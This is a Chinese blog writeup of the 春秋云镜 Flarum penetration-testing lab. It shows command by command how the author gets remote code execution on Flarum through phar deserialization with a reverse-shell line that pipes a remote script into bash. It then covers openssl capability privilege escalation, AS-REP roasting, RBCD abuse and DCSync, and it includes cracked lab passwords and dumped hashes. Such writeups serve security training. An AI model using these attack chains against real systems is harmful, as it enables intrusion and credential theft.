---
title: "春秋云镜 Flarum Writeup"
date: 2023-08-19T10:25:37+08:00
lastmod: 2023-08-19T10:25:37+08:00
draft: false
author: "X1r0z"

tags: ['kerberos', 'windows', 'domain']
categories: ['Writeup']

hiddenFromHomePage: false
hiddenFromSearch: false

toc:
  enable: true
math:
  enable: false
lightgallery: false
---

春秋云镜 Flarum Writeup

<!--more-->

## flag01

fscan

```shell
$ fscan ./fscan_darwin_arm64 -h 39.99.157.184

   ___                              _
  / _ \     ___  ___ _ __ __ _  ___| | __
 / /_\/____/ __|/ __| '__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   <
\____/     |___/\___|_|  \__,_|\___|_|\_\
                     fscan version: 1.8.2
start infoscan
trying RunIcmp2
The current user permissions unable to send icmp packets
start ping
(icmp) Target 39.99.157.184   is alive
[*] Icmp alive hosts len is: 1
39.99.157.184:80 open
39.99.157.184:22 open
[*] alive ports len is: 2
start vulscan
[*] WebTitle: http://39.99.157.184      code:200 len:5882   title:霄壤社区
已完成 2/2
[*] 扫描结束,耗时: 38.804125792s
```

flarum 论坛

![image-20230818143558400](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181435429.png)

用户名为 `administrator` 或者 `administrator@xiaorang.lab`

草了, 密码用 **rockyou.txt** 跑了好一会, 结果是 `1chris`

然后参考 p 牛的文章

[https://tttang.com/archive/1714/](https://tttang.com/archive/1714/)

反弹 shell

```shell
./phpggc -p tar -b Monolog/RCE6 system "curl https://reverse-shell.sh/IP:Port | bash
```

编辑自定义 css

```css
step 1:
@import (inline) 'data:text/css;base64,[REDACTED]';

step 2:
.test {
    content: data-uri('phar://./assets/forum.css');
}
```

![image-20230818144939117](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181449149.png)

这里网站根目录当前用户不可写, 所以改成了 assets 目录

http://39.99.157.184/assets/1.php

提权也在这卡了一会, SUID 没有什么可以利用的命令, 需要看 capabilities

[https://www.cnblogs.com/f-carey/p/16026088.html](https://www.cnblogs.com/f-carey/p/16026088.html)

```shell
getcap -r / 2>/dev/null
```

![image-20230818150106624](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181501656.png)

利用 openssl 提权

```shell
cd /
openssl req -x509 -newkey rsa:2048 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes
openssl s_server -key /tmp/key.pem -cert /tmp/cert.pem -port 8081 -HTTP
```

flag01

```shell
curl --http0.9 -k "https://39.99.157.184:8081/root/flag/flag01.txt"
```

![image-20230818151038563](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181510595.png)

## flag03

内网信息

```shell
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.22.60.52  netmask 255.255.0.0  broadcast 172.22.255.255
        inet6 fe80::216:3eff:fe22:4833  prefixlen 64  scopeid 0x20<link>
        ether 00:16:3e:22:48:33  txqueuelen 1000  (Ethernet)
        RX packets 116311  bytes 91386506 (91.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 81915  bytes 23701517 (23.7 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 2302  bytes 243151 (243.1 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2302  bytes 243151 (243.1 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

fscan

```shell
172.22.60.52:8080 open
172.22.60.15:445 open
172.22.60.42:445 open
172.22.60.8:445 open
172.22.60.15:139 open
172.22.60.42:139 open
172.22.60.8:139 open
172.22.60.42:135 open
172.22.60.15:135 open
172.22.60.8:135 open
172.22.60.52:8081 open
172.22.60.52:80 open
172.22.60.52:22 open
172.22.60.8:88 open
[*] NetInfo:
[*]172.22.60.42
   [->]Fileserver
   [->]172.22.60.42
   [->]169.254.199.71
[*] NetInfo:
[*]172.22.60.8
   [->]DC
   [->]172.22.60.8
   [->]169.254.168.167
[*] WebTitle: https://172.22.60.52:8080 code:200 len:260    title:None
[*] NetBios: 172.22.60.42    XIAORANG\FILESERVER           
[*] NetBios: 172.22.60.15    XIAORANG\PC1                  
[*] NetBios: 172.22.60.8     [+] DC:XIAORANG\DC             
[*] NetInfo:
[*]172.22.60.15
   [->]PC1
   [->]172.22.60.15
   [->]169.254.240.118
[*] WebTitle: https://172.22.60.52:8081 code:200 len:260    title:None
[*] WebTitle: http://172.22.60.52       code:200 len:5867   title:霄壤社区
```

整理信息

```shell
172.22.60.52 本机
172.22.60.15 PC1
172.22.60.42 Fileserver
172.22.60.8 DC
```

根据题目描述, 需要拿到域用户凭据

mysql 导出 flarum 用户的用户名

![image-20230818152150146](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181521170.png)

顺手先猜一波 AS-REP Roasting

```shell
proxychains GetNPUsers.py -dc-ip 172.22.60.8 xiaorang.lab/ -usersfile user.txt -request -outputfile hash.txt
```

result

```shell
$krb5asrep$23$wangyun@XIAORANG.LAB:4116244ece5abe8c98a2733fb02db760$d1ff8b542c7f951df3e28da060478af310ce91a282797c141f22d31b48931df1ac63e914a353a4790e8a02f9c2bfa7d3543dd40a27e39474d1c74d83fd81a4fa2aaaba895676e55aa234e60d36e5316bfdbc55d571ffaff4c44a8eb2562de5e0cf2a1453308e6443d5a9ac7f867fe3cb68c65cb14e754dca1e7ba02d94ff73c96107cf72293e28b7faeb451474d2e65ffbc1e8cbef5813bc9968731993c6d177e2e18ee8b8cbe5be4292bd958769856fbe118c34c35127dd6b210106668f708439c26da931808274b41c27954f969972ac51f2d0237425ce20d07da7bf9dedec142773c03cced25cdb1b0011
$krb5asrep$23$zhangxin@XIAORANG.LAB:1fad5051938591386d59f1a2982f87bf$eb94cfc9392fe5fab67d73ace00702af130ea68f9efabb9b2066bf51deb60fbaa62a0c5594c2cdc0d702419d92ec9b1415712dfd115d07e41036800820dd0a2935f744c371249893746475c188d87ac94581d2c38727289e9420a26faef9d613eb2418044ff6cfaa692c65b3a1d955ef2af39b5fadd69bf74017a202a00ca69a742edbbcdeedad21abb6d756e8ff9faee1f1dd9559b6405654e0281af7295b6b696a5e221aa4e6468e5a0a09548ff5c46737d0ceb25b4c5833de1e49946c133a1fdc3474b4d8157ae816edae871a3018dbc78afc875be7034de69c200dd0d6eb12658a2242b92706896bb85d
```

hashcat

```shell
hashcat -a 0 -m 18200 --force hash.txt ~/Tools/字典/rockyou.txt
```

result

```shell
wangyun:Adm12geC
```

只有 wangyun 账户能爆破成功, 然后跑一遍 bloodhound

```shell
proxychains bloodhound-python -u wangyun -p Adm12geC -d xiaorang.lab -c all -ns 172.22.60.8 --zip --dns-tcp
```

![image-20230818152824759](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181528800.png)

![image-20230818152923588](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181529614.png)

FILESERVER 机器账户具有 DCSync 权限

zhangxin  用户属于 Account Operators 组, 因此对域内非域控的所有机器都具有 GenericAll ACL 权限 

那么思路就是通过 zhangxin 对 FILESERVER 配置 RBCD, 然后 DCSync 拿下域控

先看 wangyun 用户, 能够 rdp 到 PC1

![image-20230818153138413](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181531445.png)

![image-20230818153441647](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181534683.png)

xshell 连接信息

![image-20230818153603783](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181536819.png)

SharpDecryptPwd 解密密码

![image-20230818153655147](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181536181.png)

```shell
zhangxin:admin4qwY38cc
```

crackmapexec

![image-20230818153856663](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181538703.png)

![image-20230818153922055](../../../../Library/Application Support/typora-user-images/image-20230818153922055.png)

也能 rdp 到 PC1, 不过没啥有用的信息

利用 zhangxin 用户配置 Fileserver 机器的 RBCD

```shell
$ proxychains rbcd.py xiaorang.lab/zhangxin:'admin4qwY38cc' -dc-ip 172.22.60.8 -action write
 -delegate-to 'Fileserver$' -delegate-from 'TEST$'
Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] TEST$ can now impersonate users on Fileserver$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     TEST$        (S-1-5-21-3535393121-624993632-895678587-1116)
```

flag03

![image-20230818154635014](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181546066.png)

## flag04 & flag02

dump hash

```shell
➜ ~ proxychains secretsdump.py -k -no-pass Fileserver.xiaorang.lab -dc-ip 172.22.60.8
Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xef418f88c0327e5815e32083619efdf5
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:bd8e2e150f44ea79fff5034cad4539fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:b40dda6fd91a2212d118d83e94b61b11:::
[*] Dumping cached domain logon information (domain/username:hash)
XIAORANG.LAB/Administrator:$DCC2$10240#Administrator#f9224930044d24598d509aeb1a015766: (2023-08-02 07:52:21)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC
XIAORANG\Fileserver$:plain_password_hex:3000310078005b003b0049004e003500450067003e00300039003f0074006c00630024003500450023002800220076003c004b0057005e0063006b005100580024007300620053002e0038002c0060003e00420021007200230030003700470051007200640054004e0078006000510070003300310074006d006b004c002e002f0059003b003f0059002a005d002900640040005b0071007a0070005d004000730066006f003b0042002300210022007400670045006d0023002a002800330073002c00320063004400720032002f003d0078006a002700550066006e002f003a002a0077006f0078002e0066003300
XIAORANG\Fileserver$:aad3b435b51404eeaad3b435b51404ee:951d8a9265dfb652f42e5c8c497d70dc:::
[*] DPAPI_SYSTEM
dpapi_machinekey:0x15367c548c55ac098c599b20b71d1c86a2c1f610
dpapi_userkey:0x28a7796c724094930fc4a3c5a099d0b89dccd6d1
[*] NL$KM
 0000   8B 14 51 59 D7 67 45 80  9F 4A 54 4C 0D E1 D3 29   ..QY.gE..JTL...)
 0010   3E B6 CC 22 FF B7 C5 74  7F E4 B0 AD E7 FA 90 0D   >.."...t........
 0020   1B 77 20 D5 A6 67 31 E9  9E 38 DD 95 B0 60 32 C4   .w ..g1..8...`2.
 0030   BE 8E 72 4D 0D 90 01 7F  01 30 AC D7 F8 4C 2B 4A   ..rM.....0...L+J
NL$KM:8b145159d76745809f4a544c0de1d3293eb6cc22ffb7c5747fe4b0ade7fa900d1b7720d5a66731e99e38dd95b06032c4be8e724d0d90017f0130acd7f84c2b4a
[*] Cleaning up...
[*] Stopping service RemoteRegistry
```

利用 Fileserver 机器账户进行 DCSync

```shell
➜ ~ proxychains secretsdump.py xiaorang.lab/'Fileserver$':@172.22.60.8 -hashes ':951d8a9265dfb652f42e5c8c497d70dc' -just-dc-user Administrator
Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c3cfdc08527ec4ab6aa3e630e79d349b:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:4502e83276d2275a8f22a0be848aee62471ba26d29e0a01e2e09ddda4ceea683
Administrator:aes128-cts-hmac-sha1-96:38496df9a109710192750f2fbdbe45b9
Administrator:des-cbc-md5:f72a9889a18cc408
[*] Cleaning up...
```

flag04

![image-20230818155541018](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181555074.png)

flag02

![image-20230818155644406](https://exp10it-1252109039.cos.ap-shanghai.myqcloud.com/img/202308181556457.png)